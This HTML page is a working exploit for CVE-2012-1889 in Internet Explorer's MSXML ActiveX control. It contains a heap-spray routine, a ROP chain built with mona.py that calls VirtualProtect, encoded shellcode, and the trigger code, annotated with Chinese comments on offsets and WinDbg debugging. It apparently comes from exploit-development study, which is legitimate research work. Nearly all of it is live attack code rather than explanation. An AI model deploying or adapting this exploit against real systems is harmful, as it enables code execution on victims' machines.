<!DOCTYPE html>
<html>
<head>
<object classid="clsid:F6D90F11-9C73-11D3-B32E-00C04F990BB4" id='active_x'></object>
<script type="text/javascript">
var total_size = 0x100000 * 200; // 200MB
var heap_chunk_size = 0x80000;
var block_size = 0x1000;
var off = 0xbe8 / 2; // 0C0C0C0C到UserPtr+4的偏移=(0C0C0C0C-xxxx0020 - 4) % 0x10000 = 0xBE8. UserPtr指向BSTR字符串对象的首地址, 还要跳过开头4字节的size域.

  //rop chain generated with mona.py - www.corelan.be
  var rop_gadgets = unescape(
    "%u5aa3%u769c" + // 0x769c5aa3 : ,# POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u5aa3%u769c" + // 0x769c5aa3 : ,# skip 4 bytes [msvcrt.dll] ** REBASED ** ASLR
    "%u087e%u7699" + // 0x7699087e : ,# POP EBX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "%ue625%u7698" + // 0x7698e625 : ,# POP EDX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "%u34b2%u7697" + // 0x769734b2 : ,# POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u397a%u76a0" + // 0x76a0397a : ,# &Writable location [msvcrt.dll] ** REBASED ** ASLR
    "%u8dfd%u7697" + // 0x76978dfd : ,# POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u9f09%u7696" + // 0x76969f09 : ,# RETN (ROP NOP) [msvcrt.dll] ** REBASED ** ASLR
    "%u4cb4%u7697" + // 0x76974cb4 : ,# POP ESI # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%ub7bd%u7696" + // 0x7696b7bd : ,# JMP [EAX] [msvcrt.dll]
    "%uaeba%u7699" + // 0x7699aeba : ,# POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u11b8%u7696" + // 0x769611b8 : ,# ptr to &VirtualProtect() [IAT msvcrt.dll] ** REBASED ** ASLR
    "%u5cf4%u769c" + // 0x769c5cf4 : ,# PUSHAD # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%u30ad%u7699" + // 0x769930ad : ,# ptr to 'call esp' [msvcrt.dll] ** REBASED ** ASLR
    "");

var code = unescape(
/* 0C0C0C0C */	"%uc311%u7664" + // # RETN [kernel32.dll]
/* 0C0C0C10 */  "%uff35%u7663" + // # POP EBP # RETN [kernel32.dll]
/* 0C0C0C14 */  "%uc310%u7664" + // # XCHG EAX, ESP # RETN [kernel32.dll]
/* 0C0C0C18 */	"%uc311%u7664" + // # RETN [kernel32.dll]
/* 0C0C0C1C */  "%uc311%u7664" + // # RETN [kernel32.dll]
/* 0C0C0C20 */  "%uc311%u7664" + // # RETN [kernel32.dll]
/* 0C0C0C24 */  "%uc311%u7664" + // # RETN [kernel32.dll]
/* 0C0C0C28 */  ""); // rop chain starts here
code += rop_gadgets;

var shellcode = unescape("%uffe8%uffff%uc2ff%u9059%udb33%u8b64%u3043%u408b%u8b0c%u0c58%ud38b%uc38b%uc083%u8b30%ubf30%u114d%u013a%uef81%u10e7%u013a%uf903%u8a53%u8a06%u3a1f%u74c3%u840f%u75c0%u8010%u24fb%u0b75%uc032%uc0fe%u07eb%u4646%ueb47%u32e4%u5bc0%u013c%u0874%u1b8b%uda3b%u1574%uc0eb%u438b%u8b18%u81d8%u77eb%ufe6c%u2dff%u4e91%ufffa%uff53%uebd0%u6dfe%u7673%u7263%u2e74%u6c64%u246c");
code += shellcode;

var padding = unescape("%u0c0c%u0c0c");
while (padding.length < block_size / 2) {
	padding += padding;
}

// 把`code`覆盖到`padding`偏移`off`处
var block = padding.substring(0, off) +  code + padding.substring(off, padding.length - code.length);
padding = "";
for (var i = 0; i < heap_chunk_size / block_size; ++i) {
	padding += block;
}

// BSTR字符串对象`padding`的`length`是Unicode串的长度, 整个BSTR对象的实际长度是：
// [4字节size域] + [padding.length*2字节的Unicode串] + [2字节结束符(0x00 0x00)]
// 要使得BSTR对象的实际长度为`heap_chunk_size`, 就需要截断6个字节. 另外, 堆结构首部
// 有32字节元信息, 32字节之后才是用户分配的数据, 所以还要把`padding`截断32字节才能保
// 证一个堆结构的大小为`heap_chunk_size`
padding = padding.substring(0, (heap_chunk_size - 6 - 32)/2);

// Spray
var heap_chunks = new Array();
for (var i = 0; i < total_size / heap_chunk_size; ++i) {
	heap_chunks[i] = padding.substring(0, padding.length);
}
alert("Spray done"); // for debugging 弹出这个窗口的时候用Windbg attach上去, 然后下断点
</script>

<script type="text/javascript">
var obj = document.getElementById('active_x').object;
var srcImgPath = unescape("%u0c08%u0c0c");
while (srcImgPath.length < 0x1000) {
	srcImgPath += srcImgPath;
}
srcImgPath = "\\\\xxx" + srcImgPath;
// 在IE8中调试脚本时发现, 如果不加上"//"前缀, 那么"pic.src = srcImgPath"执行后pic.src就会成为"无效指针".
// 另外, pic.src的赋值有3中形式:
// (1) pic.src = 'hello' 最终的pic.src指向字符串形如: "file:///C:/path/to/hello"
// (2) pic.src = '\\\\hello' 最终的pic.src指向的字符串形如: "file://hello/"
// (3) pic.src = '//hello' 同(2)
// 如果我们要控制pic.src指向的字符串的最终长度, 就不能采取(1)的方式, 而是要加上"\\\\"或"//"前缀
//
// 为什么要加上3个'x'?
// 我们的目的是使得ebp-14h处的DWORD正好是0c0c0c08, 所以需要一些字节进行补齐, 否则[ebp-14h]可能不是0c0c0c08, 而可能是0c080c0c.
// 至于用多少个字节进行补齐就需要动态调试进行确定了.
srcImgPath = srcImgPath.substring(0, 0x1000 - 10);
var pic = document.createElement("img");
pic.src = srcImgPath;
pic.nameProp;
obj.definition(0);
</script>
</head>
<body>
<h1>CVE 2012-1889</h1>
</body>
</html>